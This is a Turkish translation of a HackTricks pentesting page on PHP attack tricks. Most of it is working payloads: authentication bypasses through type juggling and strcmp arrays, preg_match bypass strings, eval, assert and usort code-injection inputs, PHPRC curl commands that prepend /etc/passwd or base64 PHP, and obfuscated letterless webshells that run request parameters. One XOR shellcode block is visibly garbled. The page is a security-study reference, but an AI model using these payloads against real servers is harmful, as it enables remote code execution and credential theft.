# PHP İpuçları

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'in (https://opensea.io/collection/the-peass-family) bulunduğu koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da takip edin** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarınızı paylaşın, PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Çerezlerin yaygın konumu:

Bu aynı zamanda phpMyAdmin çerezleri için de geçerlidir.

Çerezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP Karşılaştırmalarını Atlatma

### Gevşek karşılaştırmalar/Tür Dönüşümü ( == )

Eğer PHP'de `==` kullanılıyorsa, beklenmeyen durumlar olabilir ve karşılaştırma beklenildiği gibi davranmayabilir. Bu, "==" sadece aynı türe dönüştürülen değerleri karşılaştırır, eğer karşılaştırılan verinin türünün de aynı olduğunu karşılaştırmak istiyorsanız `===` kullanmanız gerekir.

PHP karşılaştırma tabloları: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Bir sayı ile başlamayan bir dize, bir sayıya eşittir
* `"0xAAAA" == "43690" -> True` Onaltılık veya ondalık formatındaki sayılardan oluşan dizeler, diğer sayılar/dizilerle karşılaştırılabilir ve sayılar aynıysa sonuç True olur (bir dizideki sayılar sayı olarak yorumlanır)
* `"0e3264578" == 0 --> True` "0e" ile başlayan ve herhangi bir şeyi takip eden bir dize, 0'a eşit olacaktır
* `"0X3264578" == 0X --> True` "0" ile başlayan ve herhangi bir harfi takip eden (X herhangi bir harf olabilir) ve herhangi bir şeyi takip eden bir dize, 0'a eşit olacaktır
* `"0e12334" == "0" --> True` Bu çok ilginç çünkü bazı durumlarda "0" ile başlayan ve karşılaştırılan veri türüne eşit olan bazı içeriklerin dizgesini kontrol edebilirsiniz. Bu nedenle, "0e" ile başlayan ve herhangi bir harf içermeyen bir karmayı oluşturacak bir değer sağlayabilirseniz, karşılaştırmayı atlayabilirsiniz. Bu formatta **zaten karmalanmış dizgeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir dizgedeki herhangi bir harf, int 0'a eşittir

Daha fazla bilgi için [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tür Dönüşümü**, varsayılan olarak `in_array()` işlevini de etkiler (katı bir karşılaştırma yapmak için üçüncü argümanı true olarak ayarlamanız gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Eğer bu fonksiyon **herhangi bir kimlik doğrulama kontrolü** için kullanılıyorsa (örneğin şifre kontrolü) ve kullanıcı karşılaştırmanın bir tarafını kontrol ediyorsa, şifre değeri olarak bir dizi yerine boş bir dizi gönderebilir (`https://ornek.com/giris.php/?kullaniciadi=admin&sifre[]=`) ve bu kontrolü atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### Katı Tür Dönüşümü

`strcasecmp()` ile aynı hata meydana gelir.

Katı tür dönüşümü
---
Eğer `===` **kullanılıyorsa** bile, karşılaştırmanın **tür dönüşümüne karşı savunmasız** olabileceği hatalar olabilir. Örneğin, karşılaştırma **veriyi karşılaştırmadan önce farklı bir nesne türüne dönüştürüyorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanıcı girişini **doğrulamak** için kullanılabilir (herhangi bir **kelime/regex**'in **kara listesinde** olup olmadığını **kontrol eder** ve eğer değilse, kod işlemini sürdürebilir).

#### Yeni satır atlatma

Ancak, regexp'in başlangıcını sınırlarken `preg_match()` **sadece kullanıcı girişinin ilk satırını kontrol eder**, sonra eğer bir şekilde girişi **birkaç satırda gönderebilirseniz**, bu kontrolü atlayabilirsiniz. Örnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolü atlamak için değeri **yeni satırlarla urlencoded** (`%0A`) gönderebilirsiniz veya **JSON verisi** gönderebiliyorsanız, bunu **birkaç satırda** gönderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Örnek bulun: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatası atlatma**

(Bu atlatma, görünüşe göre PHP 5.2.5'te denenmiş ve PHP 7.3.15'te çalışamadı)\
Eğer `preg_match()`'e geçerli çok **büyük bir giriş** gönderebilirseniz, **işleyemez** ve kontrolü **atlayabilirsiniz**. Örneğin, eğer bir JSON'u karalistelediyse gönderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Atlatma

Hile kaynağı: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) ve [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Kısacası, sorun, PHP'deki `preg_*` fonksiyonlarının [PCRE kütüphanesi](http://www.pcre.org/) üzerine kurulması nedeniyle oluşur. PCRE'de belirli düzenli ifadeler, çok sayıda özyineli çağrı kullanılarak eşleştirilir ve bu da çok miktarda yığın alanı tüketir. Özyineli çağrıların miktarına izin verilen bir sınır belirlenebilir, ancak PHP'de bu sınır [varsayılan olarak 100.000'dir](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) ve yığın alanına sığmaktan daha fazladır.

Bu sorun hakkında daha detaylı konuşulan yazıda [Bu Stackoverflow konu başlığı](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da paylaşılmıştır. Görevimiz şimdi açıktı:\
**Regex'in 100.000'den fazla özyineli çağrı yapmasını sağlayacak bir giriş göndermek, SIGSEGV'ye neden olacak ve `preg_match()` fonksiyonunun `false` döndürmesini sağlayacak, böylece uygulamanın girişimizin kötü niyetli olmadığını düşünmesini sağlayacak ve payload'ın sonunda `{system(<çokkötükod>)}` gibi bir sürpriz atarak SSTI --> RCE --> bayrak :)**.

Evet, regex terimleri açısından, aslında 100k "özyineli çağrı" yapmıyoruz, ancak "geri izleme adımlarını" sayıyoruz, ki bu da [PHP belgelerinde](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) belirtildiği gibi `pcre.backtrack_limit` değişkeninde varsayılan olarak 1.000.000 (1M) olur.\
Buna ulaşmak için, `'X'*500_001` ifadesi 1 milyon geri izleme adımına (500k ileri ve 500k geri) yol açacaktır:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation için Tür Tipi Dönüşümü
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Yönlendirmeden Sonra Yürüt (EAR)

Eğer PHP başka bir sayfaya yönlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** başlığı ayarlandıktan sonra çağrılmamışsa, PHP yürütmeye devam eder ve verileri gövdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Yol Traversal ve Dosya Dahil Etme Sömürüsü

Kontrol et:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[dosya-dahil-etme](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1** sürümlerinde veya yanlış yapılandırılmışsa, **register\_globals** etkin olabilir (veya davranışları taklit ediliyor olabilir). Bu, global değişkenlerde $\_GET gibi bir değer varsa örneğin $\_GET\["param"]="1234", bu değere **$param** üzerinden erişebilirsiniz. Bu nedenle, HTTP parametreleri göndererek kod içinde kullanılan değişkenleri **üzerine yazabilirsiniz**.
* **Aynı alanın PHPSESSION çerezleri aynı yerde saklanır**, bu nedenle bir alan içinde **farklı yollarda farklı çerezler kullanılıyorsa** bir yolun **diğer yolun çerezine erişmesini sağlayabilirsiniz**. Böylece **her iki yol da aynı isimde bir değişkene erişirse**, **o değişkenin değerini yol1'e uygulayabilirsiniz**. Sonra yol2, yol1'in değişkenlerini geçerli kabul eder (çerezin adını yol2'de karşılık gelen adı vererek).
* Makinenin kullanıcılarının **kullanıcı adlarını** elde ettiğinizde, php dizinlerinin etkin olup olmadığını kontrol etmek için **/\~\<KULLANICIADİ>** adresini kontrol edin.
* [**Php sargılarını kullanarak LFI ve RCE**](../../../pentesting-web/file-inclusion/) 

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **şifrelerden hash'ler oluşturmak** ve bir şifrenin bir hash ile karşılaştırıldığında doğru olup olmadığını **kontrol etmek** için kullanılır. Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` (başlangıcı `$2y$`). **PASSWORD\_DEFAULT'ın genellikle PASSWORD\_BCRYPT ile aynı olduğunu** unutmayın. Ve şu anda, **PASSWORD\_BCRYPT'ın 72 bayt giriş boyutunda bir sınırlaması** vardır. Bu nedenle, bu algoritmayla 72 bayttan büyük bir şeyi hashlemeye çalıştığınızda sadece ilk 72B kullanılacaktır:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP başlıkları atlayarak PHP hatalarını istismar etme

Eğer bir **PHP sayfası hataları yazdırıyor ve kullanıcı tarafından sağlanan bazı girdileri geri döndürüyorsa**, kullanıcı PHP sunucusunun geri **bazı içerikleri yeterince uzun** yazdırmasını sağlayabilir, böylece yanıt içine **başlıkları eklemeye çalıştığında sunucu hata verecektir**.\
Aşağıdaki senaryoda **saldırgan sunucunun büyük hatalar vermesini sağladı**, ve ekran görüntüsünde görebileceğiniz gibi PHP **başlık bilgilerini değiştirmeye çalıştığında** (örneğin CSP başlığı kullanıcıya gönderilmedi):

![](<../../../.gitbook/assets/image (1085).png>)

## Kod yürütme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla faydalı PHP fonksiyonu için buraya bakın](php-useful-functions-disable\_functions-open\_basedir-bypass/) 

### **preg\_replace()** aracılığıyla RCE
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argümanındaki kodu yürütmek için en az bir eşleşme gereklidir. Bu preg\_replace seçeneği **PHP 5.5.0'dan itibaren kullanımdan kaldırılmıştır.**

### **Eval() Aracılığıyla Uzaktan Kod Çalıştırma (RCE)**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Bu php içindeki fonksiyon, bir dize içinde yazılmış kodu **çalıştırmanıza** olanak tanır ve buna bağlı olarak **true veya false döndürür** (ve buna bağlı olarak yürütümü değiştirir). Genellikle kullanıcı değişkeni bir dizenin ortasına yerleştirilir. Örneğin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek için şunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
### RCE via usort()

Bu fonksiyon, belirli bir işlevi kullanarak öğelerin bir dizisini sıralamak için kullanılır.\
Bu işlevi kötüye kullanmak için:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**Kapanış parantezlerini kaç tane kapatmanız gerektiğini keşfetmek için:**

- `?order=id;}//`: Bir hata mesajı alırız (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantezi eksik yapmışızdır.
- `?order=id);}//`: Bir **uyarı** alırız. Bu doğru gibi görünüyor.
- `?order=id));}//`: Bir hata mesajı alırız (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanış parantezimiz var.

### **.httaccess Üzerinden RCE**

Eğer bir **.htaccess** dosyası **yükleyebilirseniz**, birçok şeyi yapılandırabilir ve hatta kodu çalıştırabilirsiniz (bu dosyaların uzantısını **çalıştırılabilir** olarak yapılandırabilirsiniz).

Farklı .htaccess kabuklarına [buradan](https://github.com/wireghoul/htshells) ulaşabilirsiniz.

### Env Değişkenleri Üzerinden RCE

Eğer **PHP'de env değişkenlerini değiştirmenize izin veren bir zayıflık bulursanız** (ve başka bir dosya yükleme zayıflığı da bulursanız, daha fazla araştırma ile bunun atlatılabileceği belki), bu davranışı **RCE** elde etmek için kötüye kullanabilirsiniz.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu env değişkeni, diğer ikili dosyaları çalıştırırken keyfi kütüphaneleri yüklemenize izin verir (ancak bu durumda işe yaramayabilir).
* **`PHPRC`** : PHP'ye **yapılandırma dosyasını nerede bulacağını söyler**, genellikle `php.ini` olarak adlandırılır. Kendi yapılandırma dosyanızı yükleyebiliyorsanız, o zaman, PHP'yi bu dosyaya yönlendirmek için `PHPRC`'yi kullanın. İkinci yüklenen bir dosyayı belirten bir **`auto_prepend_file`** girişi ekleyin. Bu ikinci dosya, normal **PHP kodunu içerir ve ardından PHP çalışma zamanı tarafından diğer tüm kodlardan önce yürütülür**.
1. Kabuk kodumuzu içeren bir PHP dosyası yükleyin
2. İkinci bir dosya yükleyin, adım 1'de yüklediğimiz dosyayı yürütmek için PHP ön işleyicisine talimat veren bir **`auto_prepend_file`** yönergesi içerir
3. `PHPRC` değişkenini adım 2'de yüklediğimiz dosyaya ayarlayın.
* Bu zinciri nasıl yürüteceğinizle ilgili daha fazla bilgiyi [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) edinin.
* **PHPRC** - başka bir seçenek
* Eğer **dosya yükleyemiyorsanız**, FreeBSD'de "dosya" `/dev/fd/0`'ı kullanabilirsiniz, bu **`stdin`** içeren bir **`stdin`'e gönderilen isteğin gövdesi**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Veya RCE elde etmek için **`allow_url_include`**'ı etkinleştirin ve **base64 PHP kodu** içeren bir dosyayı öne ekleyin:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845) alınmıştır.

## PHP Statik analiz

Bu fonksiyonlara çağrılarda kod ekleyip ekleyemediğinizi kontrol edin ([buradan](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Eğer bir PHP uygulamasını hata ayıklıyorsanız, `display_errors = On` ekleyerek `/etc/php5/apache2/php.ini` dosyasında hata yazdırmayı global olarak etkinleştirebilir ve apache'yi yeniden başlatabilirsiniz: `sudo systemctl restart apache2`

### PHP Kodunu Deobfuscating

PHP kodunu deobfuscate etmek için **web**[ **www.unphp.net**](http://www.unphp.net) **kullanabilirsiniz.**

## PHP Wrappers & Protocols

PHP Wrappers ve protokoller, bir sistemin yazma ve okuma korumalarını **atlaymanıza** ve onu tehlikeye atmanıza olanak tanıyabilir. [**Daha fazla bilgi için bu sayfaya**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols) bakın.

## Xdebug kimlik doğrulamasız RCE

Eğer bir `phpconfig()` çıktısında **Xdebug**'in **etkin** olduğunu görürseniz, RCE elde etmeyi denemelisiniz: [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Değişken değişkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Yeni $\_GET\["a"]\($\_GET\["b"]) kötüye kullanarak RCE

Eğer bir sayfada **keyfi bir sınıfın yeni bir nesnesini oluşturabiliyorsanız**, RCE elde edebilirsiniz, nasıl yapılacağını öğrenmek için aşağıdaki sayfayı kontrol edin:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harfler olmadan PHP çalıştırma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizliği kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Mantıksal Bağlaç) iki bit dizisini karşılaştırır ve aynı olmayan bitleri 1 olarak ayarlar.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR basit kabuk kodu

[**Bu yazıda**](https://mgp25.com/ctf/Web-challenge/) belirtildiğine göre, aşağıdaki şekilde basit bir kabuk kodu oluşturmak mümkündür:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eğer **sayı ve harf olmadan keyfi PHP kodu çalıştırabiliyorsanız**, aşağıdaki gibi bir istek gönderebilir ve keyfi PHP kodunu çalıştırmak için bu yükü istismar edebilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha detaylı bir açıklama için [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (eval içinde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl gibi
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
